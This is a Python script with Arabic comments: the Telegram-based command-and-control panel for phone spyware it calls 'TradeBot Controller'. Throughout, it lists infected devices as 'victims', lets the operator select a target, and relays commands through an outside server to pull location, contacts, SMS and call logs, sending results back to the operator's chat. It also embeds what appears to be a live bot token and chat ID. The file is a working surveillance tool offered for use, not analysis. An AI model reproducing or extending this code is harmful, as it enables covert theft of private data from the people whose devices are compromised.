import requests
import time
import json
import threading

# ===== إعدادات =====
TOKEN = "8161789676:AAEZIz_8ilIZUPpG7lvj37UnEt1WHInZkKA"
CHAT_ID = "7810572372"
SERVER_URL = "https://tradebot-hacker.onrender.com"

# ===== متغيرات =====
last_update_id = 0
victims = {}
current_target = None
paused = []
command_history = {}  # لتتبع الأوامر المرسلة

# ===== إرسال رسالة إلى تيليجرام =====
def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
        response = requests.post(url, data=data, timeout=10)
        if response.status_code != 200:
            print(f"[❌] Send failed: {response.status_code}")
        print(f"[📤] Sent: {text[:50]}...")
    except Exception as e:
        print(f"[❌] Send error: {e}")

# ===== استقبال التحديثات من تيليجرام =====
def get_updates(offset):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    try:
        resp = requests.get(url, params={"offset": offset, "timeout": 30}, timeout=35)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("ok"):
                return data.get("result", [])
    except Exception as e:
        print(f"[❌] Get updates error: {e}")
    return []

# ===== ✅ دالة جلب الأجهزة المسجلة من الخادم =====
def fetch_registered_devices():
    try:
        url = f"{SERVER_URL}/devices"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            devices = data.get("devices", {})
            for device_id, device_name in devices.items():
                if device_id not in victims:
                    victims[device_id] = device_name
                    print(f"[✅] Device discovered: {device_name} ({device_id})")
                    send_message(f"📱 *جهاز جديد مكتشف!*\n📱 {device_name}\n🆔 `{device_id}`")
            return True
    except Exception as e:
        print(f"[❌] Fetch devices error: {e}")
    return False

# ===== ✅ دالة إرسال أمر إلى جهاز =====
def send_command_to_device(device_id, command):
    try:
        url = f"{SERVER_URL}/send_command"
        payload = {"target": device_id, "command": command}
        resp = requests.post(url, json=payload, timeout=10)
        
        if resp.status_code == 200:
            data = resp.json()
            print(f"[📤] Command sent: {command} -> {device_id}")
            
            # ✅ تتبع الأمر
            if device_id not in command_history:
                command_history[device_id] = []
            command_history[device_id].append({
                "command": command,
                "timestamp": time.time()
            })
            return True
        else:
            print(f"[❌] Send command failed: {resp.status_code} - {resp.text}")
            return False
    except Exception as e:
        print(f"[❌] Send command error: {e}")
        return False

# ===== ✅ دالة جلب النتائج من جهاز =====
def fetch_results(device_id):
    try:
        url = f"{SERVER_URL}/get_results/{device_id}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            result = data.get("result")
            if result:
                return result
    except Exception as e:
        print(f"[❌] Fetch results error: {e}")
    return None

# ===== ✅ دالة اختبار الاتصال بالخادم =====
def test_server():
    try:
        url = f"{SERVER_URL}/health"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            print("✅ Server is online")
            return True
        else:
            print(f"⚠️ Server returned: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Server is offline: {e}")
        return False

# ===== ✅ حلقة الاستماع للنتائج =====
def listen_for_updates():
    last_result_times = {}
    
    while True:
        try:
            # ✅ جلب الأجهزة المسجلة كل 10 ثواني
            fetch_registered_devices()
            
            # ✅ جلب النتائج من كل جهاز
            for device_id in list(victims.keys()):
                # ✅ لا تطلب النتائج بشكل متكرر جداً
                now = time.time()
                if device_id in last_result_times and now - last_result_times[device_id] < 3:
                    continue
                last_result_times[device_id] = now
                
                result = fetch_results(device_id)
                if result:
                    device_name = victims.get(device_id, "جهاز غير معروف")
                    send_message(f"📩 *نتيجة من {device_name}*\n🆔 `{device_id}`\n━━━━━━━━━━━━━━━━━━━━━\n{result}")
                    
        except Exception as e:
            print(f"[❌] Listen error: {e}")
            
        time.sleep(2)

# ===== معالجة الأوامر =====
def handle_commands():
    global last_update_id, current_target, paused
    print("🚀 TradeBot Controller v2.0 Starting...")
    print("━━━━━━━━━━━━━━━━━━━━━")
    
    # ✅ اختبار الاتصال بالخادم
    if not test_server():
        send_message("⚠️ *الخادم غير متاح!*\nالرجاء التحقق من الاتصال")
        print("❌ Server is offline, exiting...")
        return
    
    print("📱 Waiting for devices...")
    print("💡 Use /help for commands")
    print("━━━━━━━━━━━━━━━━━━━━━")
    
    # ✅ جلب الأجهزة فوراً
    fetch_registered_devices()
    
    # ✅ بدء الاستماع للنتائج
    threading.Thread(target=listen_for_updates, daemon=True).start()
    
    while True:
        try:
            updates = get_updates(last_update_id + 1)
            for upd in updates:
                last_update_id = upd["update_id"]
                
                if "message" in upd:
                    text = upd["message"]["text"]
                    print(f"[📩] Command: {text}")
                    
                    # ===== الأوامر الأساسية =====
                    if text.startswith("/start") or text.startswith("/help"):
                        send_message(
                            "🤖 *TradeBot Controller v2.0*\n"
                            "━━━━━━━━━━━━━━━━━━━━━\n"
                            "📌 *الأوامر المتاحة:*\n"
                            "/victims - عرض الأجهزة 📱\n"
                            "/select <id> - اختيار هدف 🎯\n"
                            "/target - عرض الهدف الحالي 🎯\n"
                            "/pause <id> - إيقاف جهاز ⏸️\n"
                            "/resume <id> - استئناف ▶️\n"
                            "/paused - الأجهزة المتوقفة 📭\n"
                            "/scan - بحث عن أجهزة جديدة 🔍\n"
                            "/status - حالة الخادم 📊\n"
                            "━━━━━━━━━━━━━━━━━━━━━\n"
                            "💡 أوامر الجهاز المختار:\n"
                            "/device, /location, /contacts, /sms, /calls"
                        )
                    
                    # ===== عرض الأجهزة =====
                    elif text == "/victims":
                        if not victims:
                            send_message("📭 لا يوجد ضحايا متصلون حالياً")
                        else:
                            msg = "📱 *قائمة الأجهزة المتصلة*\n"
                            msg += "━━━━━━━━━━━━━━━━━━━━━\n"
                            for i, (k, v) in enumerate(victims.items(), 1):
                                stat = " ⏸️" if k in paused else " ✅"
                                is_current = " 🎯" if k == current_target else ""
                                msg += f"{i}. {v}{stat}{is_current} (`{k}`)\n"
                            msg += "━━━━━━━━━━━━━━━━━━━━━\n"
                            msg += "💡 استخدم /select <id> لاختيار هدف"
                            send_message(msg)
                    
                    # ===== اختيار هدف =====
                    elif text.startswith("/select"):
                        try:
                            target = text.split()[1]
                            if target in victims:
                                if target in paused:
                                    send_message(f"⏸️ *الجهاز متوقف مؤقتاً!*\n📱 {victims[target]}\n💡 استخدم /resume {target} أولاً")
                                else:
                                    current_target = target
                                    send_message(f"🎯 *تم اختيار الهدف:* {victims[target]}\n🆔 `{target}`")
                            else:
                                send_message("❌ الهدف غير موجود\n💡 استخدم /victims لعرض الأجهزة المتاحة")
                        except:
                            send_message("❌ يرجى تحديد معرف الهدف\n💡 مثال: /select 5f16fca8b38c6f96")
                    
                    # ===== عرض الهدف الحالي =====
                    elif text == "/target":
                        if current_target and current_target in victims:
                            stat = " ⏸️" if current_target in paused else " ✅"
                            send_message(f"🎯 *الهدف الحالي:* {victims[current_target]}{stat}\n🆔 `{current_target}`")
                        else:
                            send_message("🎯 لم يتم اختيار هدف\n💡 استخدم /victims ثم /select <id>")
                    
                    # ===== إيقاف جهاز =====
                    elif text.startswith("/pause"):
                        try:
                            target = text.split()[1]
                            if target in victims:
                                if target not in paused:
                                    paused.append(target)
                                    send_message(f"⏸️ *تم إيقاف الجهاز مؤقتاً:* {victims[target]}\n🆔 `{target}`")
                                else:
                                    send_message(f"ℹ️ الجهاز متوقف بالفعل: {victims[target]}")
                            else:
                                send_message("❌ الجهاز غير موجود")
                        except:
                            send_message("❌ يرجى تحديد معرف الجهاز\n💡 مثال: /pause 5f16fca8b38c6f96")
                    
                    # ===== استئناف جهاز =====
                    elif text.startswith("/resume"):
                        try:
                            target = text.split()[1]
                            if target in paused:
                                paused.remove(target)
                                send_message(f"▶️ *تم استئناف الجهاز:* {victims[target]}\n🆔 `{target}`")
                            else:
                                send_message("❌ الجهاز غير متوقف أو غير موجود")
                        except:
                            send_message("❌ يرجى تحديد معرف الجهاز\n💡 مثال: /resume 5f16fca8b38c6f96")
                    
                    # ===== عرض الأجهزة المتوقفة =====
                    elif text == "/paused":
                        if not paused:
                            send_message("📭 لا توجد أجهزة متوقفة")
                        else:
                            msg = "⏸️ *الأجهزة المتوقفة*\n━━━━━━━━━━━━━━━━━━━━━\n"
                            for i, pid in enumerate(paused, 1):
                                name = victims.get(pid, "جهاز غير معروف")
                                msg += f"{i}. {name} (`{pid}`)\n"
                            msg += "━━━━━━━━━━━━━━━━━━━━━\n💡 استخدم /resume <id> لاستئناف جهاز"
                            send_message(msg)
                    
                    # ===== البحث عن أجهزة جديدة =====
                    elif text == "/scan":
                        send_message("🔍 *جاري البحث عن أجهزة جديدة...*")
                        fetch_registered_devices()
                        if victims:
                            send_message(f"✅ تم العثور على {len(victims)} جهاز")
                        else:
                            send_message("📭 لم يتم العثور على أجهزة جديدة")
                    
                    # ===== حالة الخادم =====
                    elif text == "/status":
                        try:
                            resp = requests.get(f"{SERVER_URL}/health", timeout=5)
                            if resp.status_code == 200:
                                send_message(f"✅ *الخادم يعمل*\n📊 عدد الأجهزة: {len(victims)}\n🎯 الهدف الحالي: {current_target or 'لا يوجد'}\n📦 أوامر معلقة: {sum(len(cmds) for cmds in command_history.values())}")
                            else:
                                send_message(f"⚠️ *الخادم يعمل ولكن مع مشكلة* (كود: {resp.status_code})")
                        except:
                            send_message("❌ *الخادم غير متاح!*")
                    
                    # ===== أوامر للجهاز المختار =====
                    elif current_target:
                        if current_target in paused:
                            send_message(f"⏸️ *الجهاز متوقف مؤقتاً!*\n📱 {victims[current_target]}\n💡 استخدم /resume {current_target} لاستئناف")
                        else:
                            # ✅ إرسال الأمر إلى الجهاز
                            if send_command_to_device(current_target, text):
                                send_message(f"📤 *تم إرسال الأمر:*\n`{text}`\n📱 إلى: {victims[current_target]}")
                            else:
                                send_message("❌ فشل إرسال الأمر إلى الجهاز")
                    else:
                        send_message("⚠️ اختر هدفاً أولاً باستخدام /select\n💡 استخدم /victims لعرض الأجهزة المتاحة")
                    
            time.sleep(1)
            
        except Exception as e:
            print(f"[❌] Main loop error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    handle_commands()
